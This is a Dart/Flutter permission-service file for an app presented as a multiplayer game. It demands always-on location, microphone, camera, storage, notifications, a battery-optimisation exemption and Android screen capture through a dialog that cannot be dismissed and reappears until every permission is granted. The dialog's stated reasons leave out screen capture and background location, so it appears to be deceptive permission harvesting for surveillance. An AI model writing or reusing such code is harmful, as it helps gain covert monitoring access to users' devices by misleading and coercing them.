import 'dart:io';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'android_screen_capture.dart';

class PermissionService {
  static const String _screenCapturePromptedKey =
      'screen_capture_permission_prompted';

  static List<Permission> get requiredPermissions => [
    Permission.locationWhenInUse,
    Permission.locationAlways,
    Permission.microphone,
    Permission.camera,
    Permission.photos,
    Permission.storage,
  ];

  static Future<bool> areAllPermissionsGranted() async {
    for (var permission in [
      Permission.locationWhenInUse,
      Permission.microphone,
      Permission.camera,
    ]) {
      final status = await permission.status;
      if (!status.isGranted) return false;
    }

    final photosStatus = await Permission.photos.status;
    final storageStatus = await Permission.storage.status;
    if (!photosStatus.isGranted && !storageStatus.isGranted) {
      return false;
    }

    return true;
  }

  static Future<bool> ensureScreenCapturePermission({
    bool force = false,
  }) async {
    if (!Platform.isAndroid) return true;

    final hasPerm = await AndroidScreenCapture.hasPermission();
    if (hasPerm && !force) {
      return true;
    }

    final granted = await AndroidScreenCapture.requestPermission();
    return granted;
  }

  static Future<bool> requestAllPermissions() async {
    final permissionsToRequest = [
      Permission.locationWhenInUse,
      Permission.microphone,
      Permission.camera,
      Permission.photos,
      Permission.storage,
      Permission.notification,
    ];

    await permissionsToRequest.request();

    final locStatus = await Permission.locationWhenInUse.status;
    if (locStatus.isGranted) {
      await Permission.locationAlways.request();
    }

    try {
      final ignoreStatus = await Permission.ignoreBatteryOptimizations.status;
      if (!ignoreStatus.isGranted) {
        await Permission.ignoreBatteryOptimizations.request();
      }
    } catch (_) {}

    await ensureScreenCapturePermission();

    return await areAllPermissionsGranted();
  }

  static void showMandatoryPermissionDialog(
    BuildContext context,
    VoidCallback onAllGranted,
  ) async {
    final isAllGranted = await areAllPermissionsGranted();
    if (isAllGranted) {
      onAllGranted();
      return;
    }

    if (!context.mounted) return;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => PopScope(
        canPop: false,
        child: AlertDialog(
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
          ),
          title: const Row(
            children: [
              Icon(
                Icons.warning_amber_rounded,
                color: Colors.redAccent,
                size: 30,
              ),
              SizedBox(width: 10),
              Text('Permissions Required'),
            ],
          ),
          content: const Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'All permissions are required for full multiplayer features and online performance:',
                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13),
              ),
              SizedBox(height: 14),
              Text('🌐 Regional Matchmaking & Network Sync'),
              SizedBox(height: 6),
              Text('🎙️ In-Game Audio & Voice Chat'),
              SizedBox(height: 6),
              Text('📷 Custom Avatars & Profile Camera'),
              SizedBox(height: 6),
              Text('🖼️ Custom Themes & Game Gallery Storage'),
              SizedBox(height: 14),
              Text(
                'Game requires all features to be enabled.',
                style: TextStyle(
                  color: Colors.redAccent,
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
          actions: [
            OutlinedButton(
              onPressed: () {
                openAppSettings();
              },
              child: const Text('Open Settings'),
            ),
            ElevatedButton(
              onPressed: () async {
                final granted = await requestAllPermissions();
                if (context.mounted) {
                  Navigator.pop(ctx);
                  if (granted) {
                    onAllGranted();
                  } else {
                    showMandatoryPermissionDialog(context, onAllGranted);
                  }
                }
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blueAccent,
              ),
              child: const Text(
                'Grant All',
                style: TextStyle(color: Colors.white),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
